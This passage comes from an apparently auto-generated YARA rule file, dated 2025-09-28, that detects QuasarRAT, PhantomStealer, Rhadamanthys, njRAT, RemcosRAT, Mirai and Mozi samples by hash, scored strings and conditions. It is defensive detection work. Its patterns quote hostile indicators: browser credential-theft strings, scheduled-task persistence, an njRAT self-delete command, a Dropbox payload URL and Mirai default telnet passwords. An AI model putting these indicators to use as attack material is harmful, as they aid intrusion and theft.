      $s14 = "0QvL3dELy93RC8vd0QvL3dELy93RC8vd0QvL3dELy93RC8vd0QvL3dELy93RC8vd0QvL3dELy93RC8vd0QvL3dELy93RC8vd0QvL3dELy93RC8vd0QvL3dELy93RC8vd" ascii /* score: '11.00'*/
      $s15 = "kx5OHZMeTh2THk4dkx5OHZMeTh2THk4dkx5OHZMeTh2THk4dkx5OHZMeTh2THk4dkx5OHZMeTh2THk4dkx5OHZMeTh2THk4dkx5OHZMeTh2THk4dkx5OHZMeTh2THk4d" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0xbbef and filesize < 27000KB and ( 8 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2d59db9f_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_106 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2d59db9f.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3b31e670.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_907526c3.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dfccc82a.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ea90d10a.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_eb97b31c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f0059138.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f602c038.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2d59db9fed703dc46e968e99ab95ff572fb8940c9d00c304ac58c512f37591ef"
      hash2 = "3b31e67097313350e8787223555ada0708a6b3bf86d0c8606c61d350954f62d6"
      hash3 = "907526c3c3900f327899c251e01e0bd5678774fc163f0c053eec4cbe1ea5e8b2"
      hash4 = "dfccc82ae13a9096e00d79fc4bb456c3999a8c7c857a66ef778add82c106bb93"
      hash5 = "ea90d10a0f856d00da2e68829e7c87e04f0d4834a05405cdbda1455c05f7de0f"
      hash6 = "eb97b31cf676ed7549a3f1e82bf546934f0509840c496e7eeccf428de1e93138"
      hash7 = "f00591384ec47004189f26bd3766220e991c70987e0c130331a32c38e3411584"
      hash8 = "f602c038f77842fd61953e3fbfa7ec9b085f829ce7376b77b22cb93fc4927d95"
   strings:
      $s1 = "Process already elevated." fullword wide /* score: '27.00'*/
      $s2 = "potentiallyVulnerablePasswords" fullword ascii /* score: '21.00'*/
      $s3 = "User refused the elevation request." fullword wide /* score: '19.00'*/
      $s4 = ">> Failed to creation shell session: " fullword wide /* score: '18.00'*/
      $s5 = "encryptedPassword" fullword wide /* score: '17.00'*/
      $s6 = "\" /sc ONLOGON /tr \"" fullword wide /* score: '16.00'*/
      $s7 = "No executable file." fullword wide /* score: '12.00'*/
      $s8 = "password_value" fullword wide /* score: '12.00'*/
      $s9 = "moz_logins" fullword wide /* score: '12.00'*/
      $s10 = "encryptedUsername" fullword wide /* score: '12.00'*/
      $s11 = "Getting Autostart Items failed: " fullword wide /* score: '12.00'*/
      $s12 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A" fullword wide /* score: '12.00'*/
      $s13 = "session unexpectedly closed" fullword wide /* score: '12.00'*/
      $s14 = "schtasks" fullword wide /* score: '11.00'*/
      $s15 = "Can not find chromium logins file" fullword wide /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _PhantomStealer_signature__54b647e7a2c96cc7cae60be08f1c6ee2_imphash__PhantomStealer_signature__c9596ccdffde444fa435c5f9042f7_107 {
   meta:
      description = "_subset_batch - from files PhantomStealer(signature)_54b647e7a2c96cc7cae60be08f1c6ee2(imphash).exe, PhantomStealer(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe, PhantomStealer(signature)_c9596ccdffde444fa435c5f9042f7548(imphash)_2a1dbc0f.exe, RemcosRAT(signature)_75d4ca449a8e870d1b606db10dd417d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f232d497e23b33067266e2c9fb03f9ad66df46102b374a20d28c4200e227dbe9"
      hash2 = "e871bbb79c8b95b682d0d6870caeba86d70595ba711891abe6d210f38c79892b"
      hash3 = "2a1dbc0ffe84cdcbbfcf573609b9313cd3235ebabe66adf707c12d8b97d83568"
      hash4 = "6bd383fd777d39b1b6b0377430425c7f6e5b63070376ca69fe4d56f69b4395e5"
   strings:
      $s1 = "2RefreshCurrentProcessorId2ProcessorNumberSpeedCheck*UninlinedThreadStatic$get_SafeWaitHandle@" fullword ascii /* score: '20.00'*/
      $s2 = "ExecutionDomain.ReflectionCoreExecution" fullword ascii /* score: '19.00'*/
      $s3 = "IKeyedItem`1" fullword ascii /* score: '12.00'*/
      $s4 = "$LowLevelSpinWaiter ProcessorIdCache" fullword ascii /* score: '11.00'*/
      $s5 = "<ComputeMethodSignatureHashCode" fullword ascii /* score: '10.00'*/
      $s6 = ":get_FormattedInvalidCultureId" fullword ascii /* score: '9.00'*/
      $s7 = "get_BaseType\"get_IsGenericType:get_ContainsGenericParameters" fullword ascii /* score: '9.00'*/
      $s8 = "get_NaNSymbol4get_PositiveInfinitySymbol4get_NegativeInfinitySymbol\"get_PercentSymbol$get_PerMilleSymbol,get_CurrencyGroupSizes" ascii /* score: '9.00'*/
      $s9 = "ParameterHandle&TypeForwarderHandle@TypeInstantiationSignatureHandle" fullword ascii /* score: '9.00'*/
      $s10 = "GetNativeDigits@" fullword ascii /* score: '9.00'*/
      $s11 = "get_IsPointer,get_IsGenericParameter8get_IsConstructedGenericType" fullword ascii /* score: '9.00'*/
      $s12 = ",GetEnvironmentVariable" fullword ascii /* score: '9.00'*/
      $s13 = "tTGetAddingDuplicateWithKeyArgumentException" fullword ascii /* score: '8.00'*/
      $s14 = ".GetLocaleInfoFromLCType" fullword ascii /* score: '8.00'*/
      $s15 = "ThrowStartIndexArgumentOutOfRange_ArgumentOutOfRange_IndexMustBeLessOrEqualjThrowCountArgumentOutOfRange_ArgumentOutOfRange_Coun" ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__694ace6e_Rhadamanthys_signature__9cbefe68f395e67356e2a5d8_108 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_694ace6e.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_a14ca283.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_f5139fc2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "694ace6efcabaf0ba32a66581b6e710bf432761f18984891a78b5377109d7ef9"
      hash2 = "a14ca283ce205cbc9c1ca540cdfc17ff62e28557de5fa1eedfdddfdd4456b27e"
      hash3 = "f5139fc2fa5525e89dde9d4d8ccf522bf60a7990fa0e213218a11d1f23c2d7ee"
   strings:
      $s1 = ":http://crl.sectigo.com/SectigoPublicCodeSigningRootR46.crl0{" fullword ascii /* score: '19.00'*/
      $s2 = ":http://crt.sectigo.com/SectigoPublicCodeSigningRootR46.p7c0#" fullword ascii /* score: '19.00'*/
      $s3 = "2http://crl.comodoca.com/AAACertificateServices.crl04" fullword ascii /* score: '16.00'*/
      $s4 = "8http://crt.sectigo.com/SectigoPublicCodeSigningCAR36.crt0#" fullword ascii /* score: '16.00'*/
      $s5 = "8http://crl.sectigo.com/SectigoPublicCodeSigningCAR36.crl0y" fullword ascii /* score: '16.00'*/
      $s6 = "lzta!!!!!!!!" fullword ascii /* score: '13.00'*/
      $s7 = "t!!!!!!!!!" fullword ascii /* score: '10.00'*/
      $s8 = "F.lux Software LLC0" fullword ascii /* score: '9.00'*/
      $s9 = "F.lux Software LLC1" fullword ascii /* score: '9.00'*/
      $s10 = "gggggggggggggggggggggggggggxxxxxxxxxxxxxxxxpppppppppppppppppppppppppppppppp" fullword ascii /* score: '8.00'*/
      $s11 = "$Sectigo Public Code Signing Root R460" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "9cbefe68f395e67356e2a5d8d1b285c0" and ( 8 of them )
      ) or ( all of them )
}

rule _njrat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1d44d9e8_njrat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_impha_109 {
   meta:
      description = "_subset_batch - from files njrat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1d44d9e8.exe, njrat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e71d93f1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1d44d9e83cbb1656ba5a8afa3fa00ba849ff5a43eb6f49f519d4b67bc64b0c40"
      hash2 = "e71d93f19a3e41004e671b5e107177d6fd0f9a83b6b4791ce4b1853bd6620da3"
   strings:
      $x1 = "cmd.exe /k ping 0 & del \"" fullword wide /* score: '42.00'*/
      $s2 = "taskkill /F /IM PING.EXE" fullword wide /* score: '27.00'*/
      $s3 = "processhacker" fullword wide /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s4 = "Exsample.exe" fullword wide /* score: '22.00'*/
      $s5 = "/pass.exe" fullword wide /* score: '22.00'*/
      $s6 = "https://dl.dropbox.com/s/p84aaz28t0hepul/Pass.exe?dl=0" fullword wide /* score: '22.00'*/
      $s7 = "processviewer" fullword wide /* score: '19.00'*/
      $s8 = "/temp.txt" fullword wide /* score: '18.00'*/
      $s9 = "process explorer" fullword wide /* score: '17.00'*/
      $s10 = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" fullword wide /* score: '16.00'*/
      $s11 = "lpdwProcessID" fullword ascii /* score: '15.00'*/
      $s12 = "End process" fullword wide /* score: '15.00'*/
      $s13 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore" fullword wide /* score: '14.00'*/
      $s14 = "shellexecute=" fullword wide /* score: '14.00'*/
      $s15 = "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System" fullword wide /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__e791f8773bf0061740713805d84feea8_imphash__Rhadamanthys_signature__01916ef7_Rhadamanthys_signature__7bf_110 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_e791f8773bf0061740713805d84feea8(imphash).exe, Rhadamanthys(signature)_01916ef7.exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_ae9484be27b196745e2c08ee4e8427ca(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cedcfe85d91b8e4cc835547efd2d7b761b4aad101f306435a925f708fbcf1037"
      hash2 = "01916ef7e76245caac102dbb505ad4aebc28b7f1de7d7c311f31585d17cb6551"
      hash3 = "bef599d14222a9eccbebe09377f3a1ccc9e4e5367884c93c9af185c0f41bd335"
      hash4 = "c9b7aa7a67392dd4537f636d4791e75984d3862280c301c9ca0f91424f64972c"
   strings:
      $s1 = "BTryEnsureSufficientExecutionStack.GetSufficientStackLimit" fullword ascii /* score: '24.00'*/
      $s2 = "FinishStageTwo FinishStageThreeJNotifyParentIfPotentiallyAttachedTask,ProcessChildCompletion@" fullword ascii /* score: '23.00'*/
      $s3 = "QueueTask(TryExecuteTaskInline" fullword ascii /* score: '18.00'*/
      $s4 = "*ExecuteFromThreadPool@" fullword ascii /* score: '18.00'*/
      $s5 = "$ExecuteEntryUnsafeVExecuteEntryCancellationRequestedOrCanceled,ExecuteWithThreadLocal@" fullword ascii /* score: '17.00'*/
      $s6 = ".CompletionActionInvoker" fullword ascii /* score: '15.00'*/
      $s7 = "UninitializeComDInitializeExistingThreadPoolThread2get_ReentrantWaitsEnabled.GetCurrentApartmentType" fullword ascii /* score: '15.00'*/
      $s8 = "bTryStartProcessingHighPriorityWorkItemsAndDequeue@" fullword ascii /* score: '15.00'*/
      $s9 = "2RefreshCurrentProcessorId2ProcessorNumberSpeedCheck*UninlinedThreadStatic8CreateThreadLocalCountObject&AssignWorkItemQueue@" fullword ascii /* score: '11.00'*/
      $s10 = "&get_InnerExceptions@" fullword ascii /* score: '9.00'*/
      $s11 = "get_Priority@" fullword ascii /* score: '9.00'*/
      $s12 = "\"InternalQueueTask&get_InternalCurrent" fullword ascii /* score: '9.00'*/
      $s13 = "get_Id<PublishUnobservedTaskException" fullword ascii /* score: '9.00'*/
      $s14 = "get_Options@" fullword ascii /* score: '9.00'*/
      $s15 = "GetExceptions@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 26000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__fd741c9a_Mirai_signature__fd750579_Mirai_signature__fddced91_Mirai_signature__feb88695_111 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_fd741c9a.elf, Mirai(signature)_fd750579.elf, Mirai(signature)_fddced91.elf, Mirai(signature)_feb88695.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fd741c9af26c97723390dc102ba1b98a753d145ec9779547fb915a05b01975a6"
      hash2 = "fd75057993af111cf29aeb0924554d01ad28c071fb20cf9700831fd4402fbaf2"
      hash3 = "fddced91e3ab9bb4b3b0d1f62485438c12743d734698cc879981b96ac9d315d0"
      hash4 = "feb88695210f1ef75d904f23bccb4bc815d801d04b35df80e872f154f1f139a9"
   strings:
      $s1 = "User-Agent: Wget" fullword ascii /* score: '17.00'*/
      $s2 = "xirtam" fullword ascii /* reversed goodware string 'matrix' */ /* score: '15.00'*/
      $s3 = "linuxshell" fullword ascii /* score: '13.00'*/
      $s4 = "admintelecom" fullword ascii /* score: '11.00'*/
      $s5 = "supportadmin" fullword ascii /* score: '11.00'*/
      $s6 = "solokey" fullword ascii /* score: '11.00'*/
      $s7 = "/bin/busybox echo -ne " fullword ascii /* score: '11.00'*/
      $s8 = "usage: busybox" fullword ascii /* score: '9.00'*/
      $s9 = "firetide" fullword ascii /* score: '8.00'*/
      $s10 = "grouter" fullword ascii /* score: '8.00'*/
      $s11 = "wabjtam" fullword ascii /* score: '8.00'*/
      $s12 = "root621" fullword ascii /* score: '8.00'*/
      $s13 = "root123" fullword ascii /* score: '8.00'*/
      $s14 = "tsgoingon" fullword ascii /* score: '8.00'*/
      $s15 = "telnetadmin" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _PhantomStealer_signature__54b647e7a2c96cc7cae60be08f1c6ee2_imphash__RemcosRAT_signature__75d4ca449a8e870d1b606db10dd417d9_i_112 {
   meta:
      description = "_subset_batch - from files PhantomStealer(signature)_54b647e7a2c96cc7cae60be08f1c6ee2(imphash).exe, RemcosRAT(signature)_75d4ca449a8e870d1b606db10dd417d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f232d497e23b33067266e2c9fb03f9ad66df46102b374a20d28c4200e227dbe9"
      hash2 = "6bd383fd777d39b1b6b0377430425c7f6e5b63070376ca69fe4d56f69b4395e5"
   strings:
      $s1 = "System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089$UTF8EncodingSealedBSafeHandleZeroOrMinusOneIsInva" ascii /* score: '27.00'*/
      $s2 = "System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089$UTF8EncodingSealedBSafeHandleZeroOrMinusOneIsInva" ascii /* score: '27.00'*/
      $s3 = "Thread.AbandonedMutexException" fullword ascii /* score: '21.00'*/
      $s4 = "Sleep2GetCurrentProcessorNumber" fullword ascii /* score: '20.00'*/
      $s5 = "4GenericEmptyEnumeratorBase0GenericEmptyEnumerator`14ArrayTypeMismatchException.BadImageFormatException.DataMisalignedException*" ascii /* score: '13.00'*/
      $s6 = "get_Current$GetCurrentThreadId" fullword ascii /* score: '12.00'*/
      $s7 = "&InitCultureDataCore InitUserOverride8InitializeUserDefaultCulture" fullword ascii /* score: '12.00'*/
      $s8 = "(KeyNotFoundException@RandomizedStringEqualityComparer" fullword ascii /* score: '10.00'*/
      $s9 = ".GenericMethodDescriptor,MethodNameAndSignature RuntimeSignature.SegmentedArrayBuilder`1[" fullword ascii /* score: '10.00'*/
      $s10 = "$get_CurrentCulture(get_InvariantCulture" fullword ascii /* score: '9.00'*/
      $s11 = "6ThrowNullReferenceException8ThrowObjectDisposedException2ThrowOutOfMemoryExceptionNThrowOutOfMemoryException_StringTooLongnThro" ascii /* score: '9.00'*/
      $s12 = "BDrainRemainingDataForGetByteCount,ThrowLastCharRecursive@" fullword ascii /* score: '9.00'*/
      $s13 = "*GetUtf8SequenceLength&SetDefaultFallbacks" fullword ascii /* score: '9.00'*/
      $s14 = "GetValueLocked" fullword ascii /* score: '9.00'*/
      $s15 = "wOutOfMemoryException_LockEnter_WaiterCountOverflowTThrowInvalidOperationException_EnumCurrent" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _PhantomStealer_signature__c9596ccdffde444fa435c5f9042f7548_imphash__PhantomStealer_signature__c9596ccdffde444fa435c5f9042f7_113 {
   meta:
      description = "_subset_batch - from files PhantomStealer(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe, PhantomStealer(signature)_c9596ccdffde444fa435c5f9042f7548(imphash)_2a1dbc0f.exe, RemcosRAT(signature)_cc8ee04d9f6a0812cc52d3cecac318d2(imphash).exe, RemcosRAT(signature)_dcd2b16697810507d442c9bf8a9e913a(imphash).exe, RemcosRAT(signature)_e791f8773bf0061740713805d84feea8(imphash).exe, Rhadamanthys(signature)_01916ef7.exe, Rhadamanthys(signature)_1cf0e310ff7ad39ecc43438ffa3a0bb9(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_ae9484be27b196745e2c08ee4e8427ca(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e871bbb79c8b95b682d0d6870caeba86d70595ba711891abe6d210f38c79892b"
      hash2 = "2a1dbc0ffe84cdcbbfcf573609b9313cd3235ebabe66adf707c12d8b97d83568"
      hash3 = "3e2d372a69cc2489159da3251620c9f09f89a184a454b87a8c8382bb309333d9"
      hash4 = "c6499501e5e06658bb2353d8624de75952f86b0b44bb64ec0966ee1e8d97a7bf"
      hash5 = "cedcfe85d91b8e4cc835547efd2d7b761b4aad101f306435a925f708fbcf1037"
      hash6 = "01916ef7e76245caac102dbb505ad4aebc28b7f1de7d7c311f31585d17cb6551"
      hash7 = "dcdd29b2d64f816751cec2150be92711e46f67bc657dd930630616f658605cbb"
      hash8 = "bef599d14222a9eccbebe09377f3a1ccc9e4e5367884c93c9af185c0f41bd335"
      hash9 = "c9b7aa7a67392dd4537f636d4791e75984d3862280c301c9ca0f91424f64972c"
   strings:
      $s1 = "DependentHandle\"TypeLoaderExports[" fullword ascii /* score: '16.00'*/
      $s2 = "RecycleId$GetCurrentThreadId" fullword ascii /* score: '15.00'*/
      $s3 = ".AbandonedMutexException" fullword ascii /* score: '15.00'*/
      $s4 = "SignalAll" fullword ascii /* base64 encoded string 'J('jP%' */ /* score: '14.00'*/
      $s5 = "GetCharsFast@" fullword ascii /* score: '9.00'*/
      $s6 = "DecodeFirstRune@" fullword ascii /* score: '9.00'*/
      $s7 = "GetEncoder@" fullword ascii /* score: '9.00'*/
      $s8 = "&GetCodePageDataItem" fullword ascii /* score: '9.00'*/
      $s9 = "TryGetByteCount@" fullword ascii /* score: '9.00'*/
      $s10 = " GetCharCountFast@" fullword ascii /* score: '9.00'*/
      $s11 = "GetBytesFast@" fullword ascii /* score: '9.00'*/
      $s12 = "$get_FallbackBuffer@" fullword ascii /* score: '9.00'*/
      $s13 = "GetValueLocked@" fullword ascii /* score: '9.00'*/
      $s14 = "BDrainRemainingDataForGetByteCount@" fullword ascii /* score: '9.00'*/
      $s15 = "6InternalGetCodePageDataItem" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 26000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__01916ef7_Rhadamanthys_signature__7bfcbc53d4c02bdedbc3a63219e5ed9f_imphash__Rhadamanthys_signature___114 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_01916ef7.exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_ae9484be27b196745e2c08ee4e8427ca(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "01916ef7e76245caac102dbb505ad4aebc28b7f1de7d7c311f31585d17cb6551"
      hash2 = "bef599d14222a9eccbebe09377f3a1ccc9e4e5367884c93c9af185c0f41bd335"
      hash3 = "c9b7aa7a67392dd4537f636d4791e75984d3862280c301c9ca0f91424f64972c"
   strings:
      $s1 = "System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e0894SpinWaitTryAcquireCallback" fullword ascii /* score: '23.00'*/
      $s2 = "DDetermineThreadPoolThreadTimeoutMs.get_HasForcedMinThreads.get_HasForcedMaxThreads4GetIOCompletionPollerCount,CreateIOCompletio" ascii /* score: '21.00'*/
      $s3 = "DDetermineThreadPoolThreadTimeoutMs.get_HasForcedMinThreads.get_HasForcedMaxThreads4GetIOCompletionPollerCount,CreateIOCompletio" ascii /* score: '18.00'*/
      $s4 = "* RhFailFastReason" fullword ascii /* score: '15.00'*/
      $s5 = "`ReflectionExecutionDomainCallbacksImplementation" fullword ascii /* score: '12.00'*/
      $s6 = "6get_IsArrayOfReferenceTypes:TryGetGenericMethodComponents" fullword ascii /* score: '12.00'*/
      $s7 = "ExitSlowPath2get_IsHeldByCurrentThread" fullword ascii /* score: '12.00'*/
      $s8 = "GetNativeOffset4InitializeForCurrentThread@" fullword ascii /* score: '12.00'*/
      $s9 = "GetInt32Config" fullword ascii /* score: '12.00'*/
      $s10 = "$PortableThreadPool" fullword ascii /* score: '10.00'*/
      $s11 = ",CreateIoCompletionPort" fullword ascii /* score: '10.00'*/
      $s12 = "+<ComputeMethodSignatureHashCode" fullword ascii /* score: '10.00'*/
      $s13 = "<Post>b__7_0@" fullword ascii /* score: '9.00'*/
      $s14 = "GetTypeCodeImpl@" fullword ascii /* score: '9.00'*/
      $s15 = "get_SuffixDget_TypeDefInfoProjectionForArrays" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 26000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__fd885d0f_Mozi_signature__91643002_115 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_fd885d0f.elf, Mozi(signature)_91643002.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fd885d0fd20880cb0b672755e7a9b5a1951a892596444c84fde18ed73b523b16"
      hash2 = "91643002be04f1f63ddf2ab5122f1fa600b364ead3441f64511d3049c4aa57f6"
   strings:
      $s1 = "fdgets" fullword ascii /* score: '10.00'*/
      $s2 = "getsockname.c" fullword ascii /* score: '9.00'*/
      $s3 = "__GI_getsockname" fullword ascii /* score: '9.00'*/
      $s4 = "getOurIP" fullword ascii /* score: '9.00'*/
      $s5 = "getsockopt.c" fullword ascii /* score: '9.00'*/
      $s6 = "printchar" fullword ascii /* score: '8.00'*/
      $s7 = "randtbl" fullword ascii /* score: '8.00'*/
      $s8 = "numpids" fullword ascii /* score: '8.00'*/
      $s9 = "tcpcsum" fullword ascii /* score: '8.00'*/
      $s10 = "sockprintf" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__cc8ee04d9f6a0812cc52d3cecac318d2_imphash__RemcosRAT_signature__dcd2b16697810507d442c9bf8a9e913a_imphas_116 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_cc8ee04d9f6a0812cc52d3cecac318d2(imphash).exe, RemcosRAT(signature)_dcd2b16697810507d442c9bf8a9e913a(imphash).exe, RemcosRAT(signature)_e791f8773bf0061740713805d84feea8(imphash).exe, Rhadamanthys(signature)_01916ef7.exe, Rhadamanthys(signature)_1cf0e310ff7ad39ecc43438ffa3a0bb9(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_ae9484be27b196745e2c08ee4e8427ca(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3e2d372a69cc2489159da3251620c9f09f89a184a454b87a8c8382bb309333d9"
      hash2 = "c6499501e5e06658bb2353d8624de75952f86b0b44bb64ec0966ee1e8d97a7bf"
      hash3 = "cedcfe85d91b8e4cc835547efd2d7b761b4aad101f306435a925f708fbcf1037"
      hash4 = "01916ef7e76245caac102dbb505ad4aebc28b7f1de7d7c311f31585d17cb6551"
      hash5 = "dcdd29b2d64f816751cec2150be92711e46f67bc657dd930630616f658605cbb"
      hash6 = "bef599d14222a9eccbebe09377f3a1ccc9e4e5367884c93c9af185c0f41bd335"
      hash7 = "c9b7aa7a67392dd4537f636d4791e75984d3862280c301c9ca0f91424f64972c"
   strings:
      $s1 = ".ReflectionCoreExecution" fullword ascii /* score: '16.00'*/
      $s2 = "TryGetExport" fullword ascii /* score: '12.00'*/
      $s3 = "RGetRuntimeTypeHandleWithNullableTransform" fullword ascii /* score: '12.00'*/
      $s4 = "6System.IConvertible.ToInt64@" fullword ascii /* score: '10.00'*/
      $s5 = "6System.IConvertible.ToInt32@" fullword ascii /* score: '10.00'*/
      $s6 = "\"get_TimeSeparator" fullword ascii /* score: '9.00'*/
      $s7 = "get_AMDesignator get_PMDesignator" fullword ascii /* score: '9.00'*/
      $s8 = "$get_DateTimeFormat@" fullword ascii /* score: '9.00'*/
      $s9 = "*DivideByZeroException(DllNotFoundException" fullword ascii /* score: '9.00'*/
      $s10 = "get_NaNSymbol4get_PositiveInfinitySymbol4get_NegativeInfinitySymbol\"get_PercentSymbol$get_PerMilleSymbol,get_CurrencyGroupSizes" ascii /* score: '9.00'*/
      $s11 = "get_NaNSymbol4get_PositiveInfinitySymbol4get_NegativeInfinitySymbol\"get_PercentSymbol$get_PerMilleSymbol,get_CurrencyGroupSizes" ascii /* score: '9.00'*/
      $s12 = "GetFullPath&GetFullPathInternal" fullword ascii /* score: '9.00'*/
      $s13 = ",GetEnvironmentVariable4ExpandEnvironmentVariables" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 26000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__93a138801d9601e4c36e6274c8b9d111_imphash__Rhadamanthys_signature__9cbefe68f395e67356e2a5d8d1b285c0__117 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_93a138801d9601e4c36e6274c8b9d111(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_694ace6e.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_71f4b177.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_a14ca283.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_aaa80a57.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_bb3b307d.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_c2d5e6e9.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d99f5dd0.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_f5139fc2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a17b22c0eedfc76e3c98dedb4f0c7655370a70a3a715d82f253b5b5824be6105"
      hash2 = "1c135fa1f43b3d884d9f826f9f4eb3895d9976609661a9d1e60e0752b938572c"
      hash3 = "694ace6efcabaf0ba32a66581b6e710bf432761f18984891a78b5377109d7ef9"
      hash4 = "71f4b177ab5dbf844397591deda7cbb750b4fc3dda07c10f41ee3d7615278976"
      hash5 = "a14ca283ce205cbc9c1ca540cdfc17ff62e28557de5fa1eedfdddfdd4456b27e"
      hash6 = "aaa80a57fa8ecfcdcec28fec4b338eb015925e2e2b57b4aa910d559bce58199c"
      hash7 = "bb3b307d85e0e4c237c2e2ddd4222f7a93cf769c9064c08cba0940d44d62436a"
